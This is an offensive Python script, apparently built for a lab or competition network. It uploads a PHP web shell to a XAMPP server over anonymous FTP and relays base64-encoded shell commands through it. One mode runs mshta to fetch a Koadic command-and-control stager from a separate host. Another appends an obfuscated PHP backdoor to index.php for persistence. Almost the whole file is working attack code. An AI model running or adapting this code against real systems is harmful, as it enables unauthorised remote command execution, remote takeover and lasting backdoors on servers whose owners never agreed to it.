#!/usr/bin/python
import argparse, ftplib, requests, sys, urllib

target = "10.5.9.2"
path = "/xampp/htdocs"
koadic_url = "http://10.5.9.9:9999/nsrl"
koadic_cmd = "mshta " + koadic_url
persist_cmd = "echo ^<?php @extract ($_REQUEST); @die ($ctime($c($atime))); ?^> >> index.php"

mode = "cmd"
cmd = ""

def upload_ftp(f, w):
    try:
        ftp = ftplib.FTP(target, 'anonymous', 'blarknob')
        f = open(f,'rb')
        ftp.set_pasv(False)
        ftp.cwd(w)
        ftp.storbinary('STOR s.php', f)
        f.close()
        ftp.quit()
        return True
    except:
        return False

def upload_php(f, w, u=None):
    if not u:
        u = "http://10.5.9.2/s.php"
    files = {'u': open(f,'rb')}
    values = {'p': w}
    r = requests.post(u, files=files, data=values)
    print r.text
    return True

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-m', dest='mode', help='mode')
    parser.add_argument('-c', dest='cmd', help='cmd to run')
    parser.add_argument('-p', dest='put', help='file to put, requires -w')
    parser.add_argument('-w', dest='where', help='where to put, requires -p')
    parser.add_argument('-u', dest='url', help='target url')
    args = parser.parse_args()

    if not args.mode:
        print "duh --help"
        sys.exit(0)

    if args.mode == "pwn":
        if upload_ftp('tiny.php', path):
            print "done. check."
        else:
            print "error?"
    elif args.mode == "ftp_upload":
        if not args.put or not args.where:
            print "need -p and -w"
            sys.exit(1)
        if upload_ftp(args.put, args.where):
            print "done. check."
        else:
            print "error?"
    elif args.mode == "php_upload":
        if not args.put or not args.where:
            print "need -p and -w"
            sys.exit(1)
        if upload_php(args.put, args.where, args.url):
            print "done. check."
        else:
            print "error?"
    elif args.mode == "koadic":
        r = requests.get('http://' + target + '/s.php?ctime=system&c=base64_decode&atime=' + urllib.quote_plus(koadic_cmd.encode('base64')))
    elif args.mode == "persist":
        r = requests.get('http://' + target + '/s.php?ctime=system&c=base64_decode&atime=' + urllib.quote_plus(persist_cmd.encode('base64')))
    elif args.mode == "cmd":
        if not args.cmd:
            print "use -c to give a command"
            sys.exit(1)
        r = requests.get('http://' + target + '/s.php?ctime=system&c=base64_decode&atime=' + urllib.quote_plus(args.cmd.encode('base64')))
        print r.text

if __name__ == "__main__":
    main()
